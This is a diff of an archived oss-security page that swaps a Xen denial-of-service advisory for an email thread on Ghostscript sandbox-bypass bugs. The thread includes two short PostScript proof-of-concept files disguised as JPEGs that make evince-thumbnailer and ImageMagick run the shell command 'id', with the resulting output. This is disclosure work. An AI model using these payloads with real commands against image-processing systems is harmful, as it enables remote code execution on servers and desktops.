@@ -1,124 +1,147 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/27/2
-Message-Id: <E1eqdvQ-0006jx-H6@xenbits.xenproject.org>
-Date: Tue, 27 Feb 2018 12:00:04 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 252 - DoS via non-preemptable L3/L4 pagetable freeing
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/23/1
+Message-ID: <CAJ_zFkJ-qq_SRuiif-mUZmURpTgHrmwx0cp_gM3ms_-TwNVODQ@mail.gmail.com>
+Date: Wed, 22 Aug 2018 17:35:11 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Thanks Amit, that's scary, it looks like they're working on it right now.
 
-                    Xen Security Advisory XSA-252
-                              version 2
+FWIW, I figured out how to reproduce the original bug here in
+evince-thumbnailer:
 
-             DoS via non-preemptable L3/L4 pagetable freeing
+$ cat test.jpeg
+%!PS
+a0
+{ null restore } stopped { pop } if
+(ppmraw) selectdevice
+legal
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+showpage
+$ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
+execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
+"foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
+execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
 
-UPDATES IN VERSION 2
-====================
+Tavis.
 
-Public release.
+On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@...tbl.com> wrote:
 
-ISSUE DESCRIPTION
-=================
+> I also took a look a copule weeks ago at few of the patches for your
+> previous bugs from 2 years ago, and found that one of them is incomplete
+> and still allowing RCE (
+> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
+>
+> POC:
+> ------------------
+> $ cat poc.jpg
+> %!PS
+> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
+> currentdevice null true mark /OutputICCProfile (tty)
+> .putdeviceparams
+> showpage
+> $ identify poc.jpg
+> uid=1000(amit) gid=1000(amit) groups=1000(amit)
+>
+> After reviewing all of the comments in the original bug report I saw that
+> you actually mentioned this issue, but it was not taken under
+> consideration/forgotten for some reason.
+> So effectively a public RCE PoC has been avaliable for GhostScript for
+> almost 2 years.
+>
+> I opened a report two weeks ago at bugs.ghostscript.com:
+> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
+>
+> But I got no response from them until today.
+> If you have others channels of contact with them please let them know about
+> this one too.
+>
+> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@...gle.com> wrote:
+>
+> > Thanks Alex.
+> >
+> > FWIW, not all of these are visible, but I've started filing bugs, I'll
+> file
+> > a few more today and then let the developers work through the most
+> serious
+> > ones.
+> >
+> > 699654 /invalidaccess checks stop working after a failed restore
+> > 699655 missing type checking in setcolor
+> > 699656 LockDistillerParams boolean missing type checks
+> > 699659 missing type check in type checker (!)
+> > 699657 .tempfile SAFER restrictions seem to be broken
+> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
+> > 699660 shading_param incomplete type checking
+> > 699661 pdf14 garbage collection memory corruption
+> > 699662 calling .bindnow causes sideeffects
+> > 699663 .setdistillerkeys memory corruption
+> > 699664 corrupt device object after error in job
+> >
+> > I'm working on getting reproducers working for the developers for all
+> bugs.
+> >
+> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@...il.com>
+> wrote:
+> >
+> > > A small note. Both ImageMagick and GraphicsMagick process various file
+> > > formats that can nest a different image file inside of them. These are
+> > very
+> > > frequently implemented with a call to ReadImage(), with no checking
+> that
+> > > it's the expected file format. (As a result, the fuzzer finds various
+> > > impressive chains, with sometimes 3 different image formats nested
+> inside
+> > > of each other).
+> > >
+> > > The conclusion of this is that people _must not_ attempt to do their
+> own
+> > > format detection and then pass the data to IM/GM, because this can be
+> > > bypassed with nested formats. It's imperative that GS truly be disabled
+> > > with either policy.xml or by uninstall GS.
+> > >
+> > > Alex
+> > >
+> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
+> > > bfriesen@...ple.dallas.tx.us> wrote:
+> > >
+> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
+> > > > >
+> > > > > I think those thumbnails should be disabled, but you've probably
+> > > noticed
+> > > > I
+> > > > > think everything related to untrusted ghostscript should be
+> disabled
+> > > :-)
+> > > >
+> > > > I have posted to the GraphicsMagick Announcements mailing list
+> > > > regarding your findings (with a link to this list) and suggested that
+> > > > a fool-proof solution is that Ghostscript should be uninstalled.
+> > > >
+> > > > Uninstalling Ghostscript entirely might cause software using libgs to
+> > > > not execute at all unless a stub library is put in its place.
+> > > >
+> > > > Dependencies on Ghostscript are much larger than one would initially
+> > > > think due to Postscript being the traditional output from Unix
+> > > > software for "printing" and thus it is used as an intermediate format
+> > > > in order to convert between formats.  EPS content is also embedded in
+> > > > some other formats.
+> > > >
+> > > > Bob
+> > > > --
+> > > > Bob Friesenhahn
+> > > > bfriesen@...ple.dallas.tx.us,
+> > > http://www.simplesystems.org/users/bfriesen/
+> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> > > >
+> > >
+> > >
+> > > --
+> > > All that is necessary for evil to succeed is for good people to do
+> > nothing.
+> > >
+> >
+>
 
-Guests have the ability to request removal of memory from themselves.
-This operation is intended to be requested for normal read/write pages,
-but is also permitted to be used on other types of pages.  So far this
-in particular included pages pinned to their current type, with the
-necessary unpinning happening implicitly.  The unpinning of higher level
-page tables can, however, take a significant amount of time, and hence
-is generally expected to be carried out with intermediate preemption
-checks.  Such checks were missing from the code path involved here.
-
-IMPACT
-======
-
-A malicious guest administrator can cause a Denial of Service (DoS).
-Specifically, prevent use of a physical CPU for a significant period of
-time.
-
-VULNERABLE SYSTEMS
-==================
-
-All Xen versions are vulnerable.
-
-Only x86 systems are affected.  ARM systems are not affected.
-
-Only PV guests can leverage this vulnerability.  HVM guests cannot
-leverage this vulnerability.
-
-MITIGATION
-==========
-
-Running only HVM guests will avoid this issue.
-
-CREDITS
-=======
-
-This issue was discovered by Jann Horn of Google Project Zero.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa252.patch           xen-unstable, Xen 4.10.0
-xsa252-4.9.patch       Xen 4.9.x, Xen 4.8.x
-xsa252-4.7.patch       Xen 4.7.x
-xsa252-4.6.patch       Xen 4.6.x, Xen 4.5.x
-
-$ sha256sum xsa252*
-5bf651378b92520969cde49d11500bcaeffab15590d21c16736be408a85ab3fa  xsa252.meta
-53174dfd05eb274431dc756c9c3a39b355d485d6c9d12a8797b350bab343d22e  xsa252.patch
-b7ba005fa62ace07f4880cc79824968c24ead3182245e4ed3a6e22cf8d2d7c05  xsa252-4.6.patch
-14f37eb6b7a9fb19b258ca3c0e2da71dbc4240e6273137d5eb4003b122101aa6  xsa252-4.7.patch
-cb679f2145e76b1c754c4377b397d201007f50438ee18e451c4b0da3f510a293  xsa252-4.9.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBCAAGBQJalUevAAoJEIP+FMlX6CvZaDEH/0MrInFkPbVr0OFNs8KHuZNh
-5fz3sXFbf/7O0aTdFT5JJpwZaOngSyjnnKJKZMtsEHz52Nzs6o4xnYzqzNlemPJf
-FG5NKjWgQI762H8Co4z65eWwHevfDo9a1XAy2LRHlbaNkGXMwic3B2VbhW2A0Hkp
-nAATx19TpS21Fk4dK5+P8HCy+YN5RwPKKADE1Jps0MsCcSZ9NHcKfedokqpaD2DQ
-XEWlfhclzHGLdrBGFWtvBUGuxUIioB/ovVQK/6q7/Go2nLNvkrU63tdiCchzpVLA
-qXskJeatqqH/QnLXxhgzAQWf4rmjCU21l3Lh75ZK0xrRKAPFMOiPLuQ3VtVhcYA=
-=sq8W
------END PGP SIGNATURE-----
-
-Download attachment "xsa252.meta" of type "application/octet-stream" (2339 bytes)
-
-Download attachment "xsa252.patch" of type "application/octet-stream" (955 bytes)
-
-Download attachment "xsa252-4.6.patch" of type "application/octet-stream" (868 bytes)
-
-Download attachment "xsa252-4.7.patch" of type "application/octet-stream" (920 bytes)
-
-Download attachment "xsa252-4.9.patch" of type "application/octet-stream" (926 bytes)
